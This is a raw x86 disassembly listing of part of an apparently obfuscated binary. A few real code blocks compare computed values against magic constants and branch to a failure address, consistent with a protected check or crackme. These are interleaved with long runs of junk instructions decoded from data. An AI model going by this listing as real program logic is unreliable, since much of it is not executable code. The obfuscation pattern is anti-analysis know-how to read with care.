  40192a:	xor    BYTE PTR [ebp-0x1aa5486f],ah
  401930:	dec    esi
  401931:	add    eax,0x6360aab2
  401936:	xor    eax,0xf330471
  40193b:	mov    edi,0x9887cf7
  401940:	pop    ds
  401941:	in     eax,dx
  401942:	push   ebp
  401943:	cmp    esp,DWORD PTR [esi-0x5cd74880]
  401949:	sub    ch,BYTE PTR [ebp-0x1bba766a]
  40194f:	mov    eax,DWORD PTR [ebp-0x1c]
  401952:	mov    DWORD PTR [eax],0xf89f2da9
  401958:	mov    eax,DWORD PTR [ebp-0x14]
  40195b:	mov    ebx,DWORD PTR [ebp-0x8]
  40195e:	xor    eax,ecx
  401960:	xor    ebx,ecx
  401962:	xor    edx,edx
  401964:	add    eax,esi
  401966:	add    ebx,esi
  401968:	div    ebx
  40196a:	mov    edx,DWORD PTR [ebp-0x2c]
  40196d:	cmp    eax,DWORD PTR [edx]
  40196f:	je     0x40271e
  401975:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  40197c:	lea    eax,[ebp-0xc]
  40197f:	mov    DWORD PTR [ebp-0x10],eax
  401982:	jmp    0x401b9f
  401987:	int3   
  401988:	sub    eax,0xbde9be20
  40198d:	push   0xffffffa9
  40198f:	mov    ebp,0x547bf628
  401994:	sub    BYTE PTR [edx+0x707a700c],cl
  40199a:	jo     0x401a0c
  40199c:	jle    0x401a0e
  40199e:	jo     0x401932
  4019a0:	pop    edx
  4019a1:	dec    ebx
  4019a2:	xchg   esi,eax
  4019a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4019a4:	fwait
  4019a5:	imul   ecx,DWORD PTR [ebx+0x28],0x62
  4019a9:	fidivr WORD PTR [ecx+0xe178ea6]
  4019af:	aam    0xe1
  4019b1:	mov    dl,0xdd
  4019b3:	pop    edx
  4019b4:	mov    bh,0xd4
  4019b6:	xchg   edx,eax
  4019b7:	sbb    cl,ch
  4019b9:	ins    DWORD PTR es:[edi],dx
  4019ba:	cmp    BYTE PTR [ebx+eiz*8],al
  4019bd:	dec    ebx
  4019be:	mov    dl,0x77
  4019c0:	add    cl,BYTE PTR [edx]
  4019c2:	stc    
  4019c3:	and    BYTE PTR [edi],ch
  4019c5:	inc    ebp
  4019c6:	adc    ah,dh
  4019c8:	or     DWORD PTR [ebp+0x37d9bafd],0x274bff37
  4019d2:	jbe    0x401a36
  4019d4:	iret   
  4019d5:	mov    esi,0x50aa7e78
  4019da:	jbe    0x4019d5
  4019dc:	jmp    0x4019dc
  4019de:	loope  0x401a3c
  4019e0:	dec    DWORD PTR [ebp+0x73]
  4019e3:	(bad)  
  4019e5:	xor    eax,0x8bcdfdf
  4019ea:	xchg   edx,eax
  4019eb:	clc    
  4019ec:	(bad)  
  4019ee:	(bad)
  4019f1:	add    dh,dl
  4019f3:	jno    0x401a0b
  4019f5:	cs pop eax
  4019f7:	out    0xe6,eax
  4019f9:	mov    BYTE PTR [ebx],cl
  4019fb:	xchg   ecx,eax
  4019fc:	loope  0x4019c3
  4019fe:	nop
  4019ff:	jo     0x401a78
  401a01:	xchg   edx,eax
  401a02:	dec    ecx
  401a03:	scas   al,BYTE PTR es:[edi]
  401a04:	push   esp
  401a05:	add    al,0x78
  401a07:	je     0x4019fd
  401a09:	sub    DWORD PTR [ecx+0x1d],0x1a
  401a0d:	xor    ah,BYTE PTR [ecx+0x67ed926b]
  401a13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a14:	dec    edi
  401a15:	xchg   edx,eax
  401a16:	inc    esi
  401a17:	rol    BYTE PTR [eax-0x3489c265],0xd
  401a1e:	inc    edx
  401a1f:	jge    0x4019db
  401a21:	ins    DWORD PTR es:[edi],dx
  401a22:	mov    ds:0x55216e71,al
  401a27:	pop    ebx
  401a28:	xchg   edx,eax
  401a29:	cdq    
  401a2a:	pop    ecx
  401a2b:	sbb    ch,BYTE PTR [ebx+0x265c3348]
  401a31:	ror    DWORD PTR [ebx+edx*4+0x7f67bda5],1
  401a38:	out    0x9,eax
  401a3a:	fild   QWORD PTR [ebx+0x555103cf]
  401a40:	mov    dl,0x21
  401a42:	inc    ecx
  401a43:	jmp    0x98ac:0x8d542166
  401a4a:	mov    esp,0x51a41e0e
  401a4f:	sub    al,0x4c
  401a51:	out    dx,eax
  401a52:	imul   eax,DWORD PTR [esi],0x6e1642b5
  401a58:	and    ebp,DWORD PTR [esi+ebp*2]
  401a5b:	idiv   BYTE PTR [esi+0x1]
  401a5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a5f:	test   al,0xbe
  401a61:	jmp    0xa5c7:0x7dd3b855
  401a68:	sub    eax,ecx
  401a6a:	scas   eax,DWORD PTR es:[edi]
  401a6b:	cmp    DWORD PTR [ebx],0xd413a862
  401a71:	fiadd  DWORD PTR ds:0xfc044856
  401a77:	xor    DWORD PTR [ecx-0x4b],edi
  401a7a:	ret    0x1258
  401a7d:	or     eax,0x709c3652
  401a82:	jp     0x401a6a
  401a84:	(bad)  
  401a85:	sub    ah,al
  401a87:	ss and esp,0x46
  401a8b:	loopne 0x401a27
  401a8d:	popa   
  401a8e:	pop    ecx
  401a8f:	adc    esi,edx
  401a91:	cdq    
  401a92:	fnstsw WORD PTR ds:0xc8821bbb
  401a98:	sub    esi,DWORD PTR [edx]
  401a9a:	dec    ebx
  401a9b:	push   0x706e52be
  401aa0:	hlt    
  401aa1:	stos   DWORD PTR es:[edi],eax
  401aa2:	outs   dx,BYTE PTR ds:[esi]
  401aa3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401aa4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401aa5:	cwde   
  401aa6:	xchg   ebp,eax
  401aa7:	cli    
  401aa8:	dec    ecx
  401aa9:	or     bh,BYTE PTR [ecx]
  401aab:	fdiv   st,st(1)
  401aad:	lea    eax,[eax+0x2f]
  401ab0:	sahf   
  401ab1:	outs   dx,DWORD PTR ds:[esi]
  401ab2:	and    ecx,ecx
  401ab4:	mov    ah,0x45
  401ab6:	sbb    ch,BYTE PTR [edi+ecx*1]
  401ab9:	xchg   esi,eax
  401aba:	imul   ebp,DWORD PTR [eax+0x2],0xffffffc2
  401abe:	cli    
  401abf:	shl    BYTE PTR [ebx-0xaae5937],1
  401ac5:	lods   al,BYTE PTR ds:[esi]
  401ac6:	or     dl,BYTE PTR [edi+0x29]
  401ac9:	imul   esi,DWORD PTR [esi+0x8],0xecfb3ea3
  401ad0:	add    DWORD PTR [edx+0x23c73f41],eax
  401ad6:	lock jmp 0x401a8e
  401ad9:	retf   0x4c06
  401adc:	imul   esi,eax,0x20d3bc43
  401ae2:	jle    0x401af9
  401ae4:	sbb    ebx,DWORD PTR [ecx+eax*8+0x4d]
  401ae8:	push   ebp
  401ae9:	test   DWORD PTR [esi+0x57196fed],edx
  401aef:	cmp    BYTE PTR ds:0xeeecc403,al
  401af5:	sbb    eax,0x807fc16b
  401afa:	std    
  401afb:	jle    0x401af2
  401afd:	repnz pop ecx
  401aff:	in     eax,dx
  401b00:	loopne 0x401b09
  401b02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b03:	ins    BYTE PTR es:[edi],dx
  401b04:	cmp    al,ch
  401b06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b07:	out    dx,eax
  401b08:	js     0x401b81
  401b0a:	fstp   QWORD PTR [edx]
  401b0c:	sub    ecx,0xfba31d06
  401b12:	mov    edx,0xf379cac5
  401b17:	adc    bl,bl
  401b19:	inc    ebp
  401b1a:	inc    ebp
  401b1b:	fwait
  401b1c:	cmp    al,0x84
  401b1e:	lahf   
  401b1f:	cli    
  401b20:	(bad)  
  401b21:	repz sbb al,0x71
  401b24:	mov    ah,0xd1
  401b26:	mov    DWORD PTR ds:0xf0a1552,0xdf45bacf
  401b30:	lahf   
  401b31:	mov    ebp,0x1a6db31
  401b36:	mov    al,ds:0x706a28d9
  401b3b:	iret   
  401b3c:	loopne 0x401b43
  401b3e:	mov    al,0x63
  401b40:	scas   eax,DWORD PTR es:[edi]
  401b41:	xor    al,0xf9
  401b43:	ja     0x401ae6
  401b45:	jl     0x401b10
  401b47:	mov    ds,WORD PTR [edi]
  401b49:	stos   DWORD PTR es:[edi],eax
  401b4a:	test   BYTE PTR [esi+0x3c],cl
  401b4d:	pop    ds
  401b4e:	pop    ds
  401b4f:	mov    WORD PTR [esi+0x3b],es
  401b52:	jge    0x401b11
  401b54:	pop    esi
  401b55:	xchg   edi,eax
  401b56:	sub    ecx,esp
  401b58:	mov    ah,0xd8
  401b5a:	nop
  401b5b:	into   
  401b5c:	adc    al,0xa7
  401b5e:	out    dx,eax
  401b5f:	mov    ebx,0xb8237f1e
  401b64:	sar    WORD PTR [ecx+0x4753725a],0xd
  401b6c:	and    BYTE PTR [ecx+0x49],cl
  401b6f:	mov    ecx,ds
  401b71:	dec    edx
  401b72:	jmp    0x7fa4:0x9d5a62de
  401b79:	fadd   DWORD PTR [ecx+0x42]
  401b7c:	jge    0x401bbc
  401b7e:	cmp    BYTE PTR [edi-0x17764a52],ch
  401b84:	ret    
  401b85:	ds dec eax
  401b87:	repnz add DWORD PTR [eax+0x1f],0xffffff99
  401b8c:	cmp    BYTE PTR [ecx-0x5],al
  401b8f:	pmaddwd mm4,QWORD PTR [ebx+0x215a01a8]
  401b96:	js     0x401b22
  401b98:	push   edx
  401b99:	inc    ebp
  401b9a:	dec    edx
  401b9b:	stos   DWORD PTR es:[edi],eax
  401b9c:	dec    esp
  401b9d:	rcl    bh,1
  401b9f:	mov    eax,DWORD PTR [ebp-0x10]
  401ba2:	mov    edx,DWORD PTR [eax]
  401ba4:	imul   edx,edx,0xf89ea9ec
  401baa:	mov    DWORD PTR [eax],edx
  401bac:	mov    eax,DWORD PTR [ebp-0xc]
  401baf:	cmp    eax,0x742b26d4
  401bb4:	je     0x401bc8
  401bba:	mov    eax,DWORD PTR [ebp-0x1c]
  401bbd:	or     DWORD PTR [eax],0x60751c9c
  401bc3:	jmp    0x40272d
  401bc8:	mov    eax,DWORD PTR [ebp-0xc]
  401bcb:	jmp    0x401de8
  401bd0:	popa   
  401bd1:	ja     0x401bca
  401bd3:	add    esi,ecx
  401bd5:	xor    DWORD PTR [ecx+0x75],0xffffffde
  401bd9:	adc    al,0xb4
  401bdb:	mov    ah,BYTE PTR ds:0x70ce5348
  401be1:	js     0x401c53
  401be3:	jo     0x401c55
  401be5:	jle    0x401c57
  401be7:	jo     0x401b76
  401be9:	xchg   edx,eax
  401bea:	dec    esp
  401beb:	mov    ?,WORD PTR [esi+0x7c]
  401bee:	out    dx,eax
  401bef:	ror    BYTE PTR [edx-0x7d],0xe2
  401bf3:	js     0x401b92
  401bf5:	mov    al,ds:0x34c6020b
  401bfa:	sub    ah,ah
  401bfc:	idiv   BYTE PTR [ecx]
  401bfe:	in     eax,dx
  401bff:	pop    eax
  401c00:	lods   al,BYTE PTR ds:[esi]
  401c01:	cli    
  401c02:	fmul   st,st(1)
  401c04:	pop    esi
  401c05:	push   eax
  401c06:	arpl   WORD PTR [edx-0x8],si
  401c09:	mov    dl,BYTE PTR [ebp-0x68953f1d]
  401c0f:	fnsave [eax-0xcdeb3d2]
  401c15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c16:	xor    DWORD PTR [esi+0x18c3d6f5],esi
  401c1c:	cdq    
  401c1d:	repnz mov eax,0x18b774b2
  401c23:	pop    ebx
  401c24:	and    al,0x9c
  401c26:	jo     0x401be3
  401c28:	or     dl,BYTE PTR [edx-0x249d3494]
  401c2e:	test   eax,0x96b254d8
  401c33:	mov    dl,dl
  401c35:	out    dx,al
  401c36:	das    
  401c37:	cld    
  401c38:	jle    0x401cb0
  401c3a:	in     al,0x5
  401c3c:	jmp    0x6fcece8a
  401c41:	xchg   esp,eax
  401c42:	cld    
  401c43:	cwde   
  401c44:	cmp    esi,DWORD PTR [edx+0x3a3ce2c2]
  401c4a:	pop    esi
  401c4b:	test   BYTE PTR [edi-0x40cce6a7],ah
  401c51:	in     al,dx
  401c52:	and    al,0xc7
  401c54:	and    DWORD PTR [ebx+0x634f2088],0x59
  401c5b:	sbb    al,0xc0
  401c5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401c5e:	test   ecx,eax
  401c60:	jge    0x401cab
  401c62:	inc    edx
  401c63:	or     dl,bh
  401c65:	cmp    dl,BYTE PTR [edx-0x27d3b17e]
  401c6b:	mov    ebp,0xa05fb96f
  401c70:	xor    cl,bl
  401c72:	dec    eax
  401c73:	mov    gs,ebx
  401c75:	push   ss
  401c76:	xor    DWORD PTR [eax],ebp
  401c78:	mov    al,ds:0x1a6cfcb8
  401c7d:	push   es
  401c7e:	call   0xdbae2905
  401c83:	inc    edi
  401c84:	nop
  401c85:	je     0x401c37
  401c87:	xor    BYTE PTR [ecx],bh
  401c89:	dec    edi
  401c8a:	dec    esp
  401c8c:	inc    ebp
  401c8d:	aaa    
  401c8e:	dec    BYTE PTR [ebp+0x40775190]
  401c94:	sub    WORD PTR [ebp+0x56040c14],bx
  401c9b:	mov    ecx,0xb6d09b3
  401ca0:	push   esi
  401ca1:	push   DWORD PTR [eax+0x36]
  401ca4:	push   0xffffffe5
  401ca6:	dec    ebx
  401ca7:	aas    
  401ca8:	(bad)  
  401ca9:	gs (bad) 
  401cab:	call   0x18d99353
  401cb0:	xchg   esi,eax
  401cb1:	je     0x401cd1
  401cb3:	or     DWORD PTR [esi],esi
  401cb5:	push   ebx
  401cb6:	mov    dh,0x39
  401cb8:	dec    ecx
  401cb9:	call   0xc6b26555
  401cbe:	xchg   edi,eax
  401cbf:	div    DWORD PTR [ecx]
  401cc1:	out    dx,al
  401cc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401cc3:	or     edx,DWORD PTR [ebx+ebp*1+0x2]
  401cc7:	adc    edx,DWORD PTR [edx-0x5b]
  401cca:	nop
  401ccb:	test   BYTE PTR [edx+0x6b],al
  401cce:	push   eax
  401ccf:	jge    0x401d45
  401cd1:	cmc    
  401cd2:	(bad)  
  401cd3:	sub    BYTE PTR [esi],dh
  401cd5:	push   ds
  401cd6:	xchg   esp,eax
  401cd7:	cdq    
  401cd8:	sbb    ebp,DWORD PTR [esi+0x14]
  401cdb:	rcl    cl,1
  401cdd:	mov    ?,WORD PTR [esi+eiz*2]
  401ce0:	and    BYTE PTR [edx+0x6ef96bd3],cl
  401ce6:	mov    ds:0x781e6428,al
  401ceb:	cmp    BYTE PTR [esi-0x131277fa],0xca
  401cf2:	test   eax,0xae86b806
  401cf7:	cwde   
  401cf8:	lock mov al,ds:0x924424b0
  401cfe:	mov    edi,0x2eccc249
  401d03:	or     BYTE PTR [eax-0x99eaf50],0x22
  401d0a:	adc    eax,0x44cbef12
  401d0f:	int    0x5
  401d11:	mov    edx,0xe815598e
  401d16:	loopne 0x401d1d
  401d18:	cmp    DWORD PTR [ebx+0x6fd437e9],edi
  401d1e:	pop    ebx
  401d1f:	dec    esi
  401d20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d21:	dec    ebx
  401d22:	std    
  401d23:	mov    ds:0xc248ef1,eax
  401d28:	mov    edi,0xe1392825
  401d2d:	cdq    
  401d2e:	mov    WORD PTR [eax+0x9c22605],ds
  401d34:	push   edx
  401d35:	test   eax,0xa0f7ff53
  401d3a:	inc    ecx
  401d3b:	sub    eax,0x1987f034
  401d40:	mov    ebx,0x6a473de6
  401d45:	lds    eax,FWORD PTR [esi]
  401d47:	sub    BYTE PTR [ecx],cl
  401d49:	push   ss
  401d4a:	test   eax,0x8e77b4a2
  401d4f:	enter  0x7b57,0xc7
  401d53:	pop    ss
  401d54:	pop    ds
  401d55:	icebp  
  401d56:	push   ebx
  401d57:	and    ecx,DWORD PTR [edi+0x4d00acad]
  401d5d:	pop    ebp
  401d5e:	mov    al,ds:0xddf28182
  401d63:	adc    DWORD PTR [ebx+0x419ad585],ecx
  401d69:	outs   dx,BYTE PTR ds:[esi]
  401d6a:	mov    al,ds:0xe70bdc64
  401d6f:	xchg   edi,eax
  401d70:	mov    eax,0x3369e1b1
  401d75:	stos   BYTE PTR es:[edi],al
  401d76:	je     0x401de6
  401d78:	stos   DWORD PTR es:[edi],eax
  401d79:	pop    eax
  401d7a:	jg     0x401dac
  401d7c:	jle    0x401d66
  401d7e:	jecxz  0x401dd5
  401d80:	bnd je 0x401d0c
  401d83:	adc    DWORD PTR [ebx+0x5e2732c1],0xffffffa7
  401d8a:	and    eax,0x3bd90292
  401d8f:	lods   al,BYTE PTR ds:[esi]
  401d90:	dec    esp
  401d91:	ror    BYTE PTR [esi],0xde
  401d94:	fisub  WORD PTR [esi-0xd]
  401d97:	or     BYTE PTR [eax],0xdb
  401d9a:	xor    al,0xd8
  401d9c:	xlat   BYTE PTR ds:[ebx]
  401d9d:	rcr    ecx,0xe9
  401da0:	retf   0xc931
  401da3:	inc    edi
  401da4:	and    eax,0x7f654e0b
  401da9:	xchg   edi,eax
  401daa:	scas   al,BYTE PTR es:[edi]
  401dab:	jecxz  0x401d7f
  401dad:	dec    esi
  401dae:	call   0x61037a3
  401db3:	les    eax,FWORD PTR [ebx-0x4e021d13]
  401db9:	mov    dl,0x73
  401dbb:	lods   eax,DWORD PTR ds:[esi]
  401dbc:	fs add ecx,ecx
  401dbf:	jmp    0xf68d:0xa9f29faa
  401dc6:	xor    eax,0x2b13bdab
  401dcb:	(bad)  
  401dcc:	adc    esp,esi
  401dce:	push   es
  401dcf:	and    DWORD PTR [edi+0x797e36e8],edi
  401dd5:	dec    edx
  401dd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401dd7:	add    esp,DWORD PTR [ebp-0x1e]
  401dda:	fistp  QWORD PTR [esi]
  401ddc:	in     eax,0x7b
  401dde:	sbb    BYTE PTR [edx-0x7c],bh
  401de1:	mov    dh,0x28
  401de3:	popf   
  401de4:	retf   
  401de5:	adc    BYTE PTR [edi],0x3c
  401de8:	add    eax,DWORD PTR [ebp-0x18]
  401deb:	cmp    eax,0x6cca547d
  401df0:	je     0x401e04
  401df6:	mov    eax,DWORD PTR [ebp-0x10]
  401df9:	and    DWORD PTR [eax],0x751c99
  401dff:	jmp    0x40272d
  401e04:	mov    eax,DWORD PTR [ebp-0xc]
  401e07:	mov    edx,DWORD PTR [ebp-0x18]
  401e0a:	or     eax,edx
  401e0c:	cmp    eax,0xfcbf2ffd
  401e11:	je     0x401e25
  401e17:	mov    eax,DWORD PTR [ebp-0x10]
  401e1a:	xor    DWORD PTR [eax],0x2650fa8f
  401e20:	jmp    0x40272d
  401e25:	mov    ax,WORD PTR [ebp-0x4]
  401e29:	mov    edx,0x8a3e
  401e2e:	xor    ax,dx
  401e31:	jmp    0x40204e
  401e36:	cld    
  401e37:	test   BYTE PTR [edx+0x3d],ch
  401e3a:	jb     0x401e31
  401e3c:	stos   DWORD PTR es:[edi],eax
  401e3d:	inc    ecx
  401e3e:	inc    eax
  401e3f:	(bad)  
  401e40:	cmp    BYTE PTR [ecx+eax*8-0x40],dl
  401e44:	cwde   
  401e45:	inc    ecx
  401e46:	jo     0x401e4e
  401e48:	jo     0x401eba
  401e4a:	jo     0x401eca
  401e4c:	jo     0x401ebe
  401e4e:	scas   eax,DWORD PTR es:[edi]
  401e4f:	enter  0x6cb9,0x12
  401e53:	mov    esp,0xd44ee673
  401e58:	xchg   ebp,eax
  401e59:	fsub   DWORD PTR [edx-0x53]
  401e5c:	xchg   esp,eax
  401e5d:	daa    
  401e5e:	in     al,dx
  401e5f:	lahf   
  401e60:	out    dx,eax
  401e61:	pop    es
  401e62:	fdiv   st,st(0)
  401e64:	mov    eax,ds:0x993f0522
  401e69:	jbe    0x401e72
  401e6b:	push   ebp
  401e6c:	leave  
  401e6d:	sbb    al,BYTE PTR [edx]
  401e6f:	cmp    eax,0x38e2adcf
  401e74:	sbb    esi,0x24
  401e77:	inc    esi
  401e78:	ret    
  401e79:	cmp    ch,cl
  401e7b:	jnp    0x401ec1
  401e7d:	xchg   ebp,eax
  401e7e:	loopne 0x401ea8
  401e80:	loope  0x401e22
  401e82:	adc    ebx,esi
  401e84:	push   ecx
  401e85:	aam    0xa9
  401e87:	retf   
  401e88:	cli    
  401e89:	dec    edi
  401e8a:	scas   eax,DWORD PTR es:[edi]
  401e8b:	pop    ds
  401e8c:	or     DWORD PTR [eax],esp
  401e8e:	xor    BYTE PTR [ebx],al
  401e90:	outs   dx,DWORD PTR ds:[esi]
  401e91:	pusha  
  401e92:	loop   0x401e2e
  401e94:	cmc    
  401e95:	repnz aad 0x2b
  401e98:	push   0x60
  401e9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e9b:	adc    DWORD PTR [ebx-0x64b7e489],edi
  401ea1:	lods   al,BYTE PTR ds:[esi]
  401ea2:	loopne 0x401e6f
  401ea4:	push   DWORD PTR [ebp+0x20]
  401ea7:	mov    bl,0x17
  401ea9:	mov    ch,0x7c
  401eab:	retf   
  401eac:	xchg   edx,ebx
  401eae:	xor    al,0x8a
  401eb0:	push   0xc6f987e7
  401eb5:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  401eb7:	lea    eax,[ebx-0x66]
  401eba:	pop    ebx
  401ebb:	inc    esp
  401ebc:	xor    eax,ebx
  401ebe:	inc    esp
  401ebf:	test   eax,0x2e1b9bb0
  401ec4:	xlat   BYTE PTR ds:[ebx]
  401ec5:	inc    ecx
  401ec6:	mov    edi,0x95ca0703
  401ecb:	adc    BYTE PTR [edx+eiz*1-0x56],cl
  401ecf:	jno    0x401f2e
  401ed1:	mov    al,ds:0x9c07c8dd
  401ed6:	fisub  WORD PTR [eax]
  401ed8:	mov    ch,0xa2
  401eda:	adc    DWORD PTR [ecx-0x63cc1920],ebx
  401ee0:	rcr    BYTE PTR [esi-0xf07a20b],0x36
  401ee7:	or     al,0x10
  401ee9:	add    DWORD PTR [ecx+0x4d38c24f],ecx
  401eef:	mov    ds:0xc85f5ca8,al
  401ef4:	push   esi
  401ef5:	jne    0x401f1c
  401ef7:	daa    
  401ef8:	adc    esi,esi
  401efa:	mov    ah,al
  401efc:	xor    al,0xaa
  401efe:	shr    BYTE PTR [esp+0x765a05d4],1
  401f05:	ret    0x5969
  401f08:	pop    ebx
  401f09:	test   eax,0x82b68a87
  401f0e:	push   ds
  401f0f:	stos   BYTE PTR es:[edi],al
  401f10:	shl    DWORD PTR [ebx+0x3b460d07],1
  401f16:	or     DWORD PTR [eax+0x43cd0158],0x6e3d7af9
  401f20:	or     al,0xfb
  401f22:	inc    ebp
  401f23:	imul   ebx,DWORD PTR [ecx],0xfffffffe
  401f26:	aad    0x51
  401f28:	in     eax,0x64
  401f2a:	gs mov ah,0x22
  401f2d:	pop    DWORD PTR [ecx+0x5dae9fd3]
  401f33:	mov    eax,ds:0x531392f8
  401f38:	mov    dl,BYTE PTR [ecx+0x4001480]
  401f3e:	push   edx
  401f3f:	push   esp
  401f40:	xor    DWORD PTR [edx+0x2c],edx
  401f43:	out    0x2e,eax
  401f45:	stos   BYTE PTR es:[edi],al
  401f46:	jne    0x401f21
  401f48:	out    dx,al
  401f49:	jne    0x401f98
  401f4b:	xor    al,0x14
  401f4d:	sbb    dl,cl
  401f4f:	or     BYTE PTR [edx+0x3e],bl
  401f52:	ins    DWORD PTR es:[edi],dx
  401f53:	xor    dl,ah
  401f55:	adc    DWORD PTR [ecx],0x47
  401f58:	sub    al,bh
  401f5a:	mov    dl,0x3e
  401f5c:	add    al,0x80
  401f5e:	inc    eax
  401f5f:	cmp    al,0x2d
  401f61:	jge    0x401f2b
  401f63:	mov    dl,0x96
  401f65:	loop   0x401fc1
  401f67:	push   sp
  401f69:	jo     0x401f8f
  401f6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f6c:	pop    edi
  401f6d:	sbb    esp,ebx
  401f6f:	pop    eax
  401f70:	enter  0x6d95,0x92
  401f74:	(bad)  
  401f75:	cmp    al,0x17
  401f77:	not    dh
  401f79:	sbb    eax,0x757cc91c
  401f7e:	add    eax,0x1549b7a1
  401f83:	std    
  401f84:	jmp    DWORD PTR [ebx]
  401f86:	xchg   edi,eax
  401f87:	in     eax,dx
  401f88:	xor    bl,BYTE PTR [ebx+0x36]
  401f8b:	(bad)  
  401f8c:	dec    ebx
  401f8d:	xchg   esi,eax
  401f8e:	jl     0x401f9f
  401f90:	fucomp st(7)
  401f92:	push   es
  401f93:	cmp    ebp,edi
  401f95:	das    
  401f96:	adc    bl,ch
  401f98:	sub    al,0x8e
  401f9a:	jp     0x401fbe
  401f9c:	arpl   WORD PTR [ecx-0xf920fb8],cx
  401fa2:	inc    edx
  401fa3:	cmc    
  401fa4:	or     al,0xb0
  401fa6:	mov    dh,0x6a
  401fa8:	xor    esp,ebp
  401faa:	push   edi
  401fab:	cld    
  401fac:	call   0xa931be6b
  401fb1:	popa   
  401fb2:	ja     0x40200f
  401fb4:	(bad)  
  401fb5:	fcomp  st(2)
  401fb7:	dec    esp
  401fb8:	popa   
  401fb9:	jmp    0x61fbce85
  401fbe:	mov    ecx,0x5bdb271
  401fc3:	jl     0x402031
  401fc5:	inc    ebp
  401fc6:	(bad)  
  401fc7:	fwait
  401fc8:	ret    0x909d
  401fcb:	inc    eax
  401fcc:	inc    edx
  401fcd:	push   cs
  401fce:	mov    edi,0x99cbb6a8
  401fd3:	sub    ch,al
  401fd5:	push   ebx
  401fd7:	pop    eax
  401fd8:	aaa    
  401fd9:	lds    ecx,FWORD PTR [esi-0x57cd5916]
  401fdf:	pusha  
  401fe0:	call   0xa63b:0x4c99354
  401fe7:	les    esp,FWORD PTR [esi+0x44]
  401fea:	pop    gs
  401fec:	jmp    0x401f7c
  401fee:	daa    
  401fef:	pop    ebx
  401ff0:	stos   DWORD PTR es:[edi],eax
  401ff1:	stos   DWORD PTR es:[edi],eax
  401ff2:	mov    bl,0xf3
  401ff4:	jmp    0xc711:0xf53988da
  401ffb:	sbb    dl,al
  401ffd:	lahf   
  401ffe:	out    0x1e,eax
  402000:	sbb    eax,0x7eb2c629
  402005:	(bad)
  402009:	test   al,0xd0
  40200b:	mov    eax,ds:0x4aba01ea
  402010:	adc    DWORD PTR [edx-0x21],edi
  402013:	imul   eax,DWORD PTR [esi-0x57],0xffffff97
  402017:	push   ebx
  402018:	popa   
  402019:	cmp    edi,eax
  40201b:	adc    dl,ch
  40201d:	(bad)  
  40201e:	imul   esp,DWORD PTR [eax],0xffffffac
  402021:	jp     0x401fdf
  402023:	add    al,0x71
  402025:	jmp    0x40209b
  402027:	add    ah,BYTE PTR [edx+eax*2+0x44]
  40202b:	out    0x8b,al
  40202d:	dec    edi
  40202e:	pop    edx
  40202f:	dec    eax
  402030:	mov    edx,0x55d3f5ac
  402035:	in     al,0x94
  402037:	in     eax,0xca
  402039:	pushf  
  40203a:	push   cs
  40203b:	and    eax,0x3af80cbb
  402040:	jecxz  0x402036
  402042:	(bad)  
  402043:	lods   al,BYTE PTR ds:[esi]
  402044:	(bad)  
  402045:	addr16 push ebp
  402047:	dec    edx
  402048:	add    DWORD PTR [ebp+0x4e7e8bcd],edx
  40204e:	mov    edx,DWORD PTR [ebp-0x28]
  402051:	mov    edx,DWORD PTR [edx]
  402053:	add    ax,di
  402056:	cmp    ax,WORD PTR [edx]
  402059:	jmp    0x402276
  40205e:	ret    0x801a
  402061:	gs push 0xfb99f171
  402067:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402068:	ins    BYTE PTR es:[edi],dx
  402069:	cmp    dh,0xdc
  40206c:	sbb    edi,edi
  40206e:	jo     0x402074
  402070:	jo     0x4020e2
  402072:	jo     0x4020f2
  402074:	jo     0x4020e6
  402076:	(bad)  
  402077:	cli    
  402078:	dec    esp
  402079:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40207a:	xor    al,0xb4
  40207c:	clc    
  40207d:	stc    
  40207e:	add    DWORD PTR [esi],edi
  402080:	(bad)  
  402081:	jge    0x402050
  402083:	adc    al,0x94
  402085:	inc    esi
  402086:	sbb    ebp,edx
  402088:	dec    ebp
  402089:	gs out 0xee,al
  40208c:	adc    BYTE PTR [ebp-0x1],0xf
  402090:	nop
  402091:	into   
  402092:	cmp    eax,DWORD PTR [ebp+0x34]
  402095:	(bad)
  402099:	sbb    DWORD PTR [eax-0x6992bbc],edi
  40209f:	or     ch,BYTE PTR [ecx]
  4020a1:	mov    edi,0xb648d85d
  4020a6:	aam    0xe0
  4020a8:	mov    ch,0x6c
  4020aa:	mov    bl,0x28
  4020ac:	mul    eax
  4020ae:	xchg   ecx,eax
  4020af:	cmp    edi,edi
  4020b1:	cmp    edi,DWORD PTR [esp+edi*4-0x21]
  4020b5:	mov    cl,0x53
  4020b7:	pop    edi
  4020b8:	adc    BYTE PTR [ebx],ah
  4020ba:	inc    esi
  4020bb:	inc    ecx
  4020bc:	out    dx,al
  4020bd:	jmp    0x7063:0xb83c8ae5
  4020c4:	inc    ebp
  4020c5:	pop    edx
  4020c6:	pop    ecx
  4020c7:	retf   
  4020c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4020c9:	stos   BYTE PTR es:[edi],al
  4020ca:	dec    esi
  4020cb:	(bad)  
  4020cc:	jecxz  0x402135
  4020ce:	push   ebx
  4020cf:	aad    0x5
  4020d1:	shl    dl,0xe8
  4020d4:	xchg   DWORD PTR [eax],eax
  4020d6:	pop    eax
  4020d7:	mov    edi,edx
  4020d9:	pop    ecx
  4020da:	and    ah,al
  4020dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4020dd:	push   ebp
  4020de:	stc    
  4020df:	repnz inc DWORD PTR [ebx-0x2184636d]
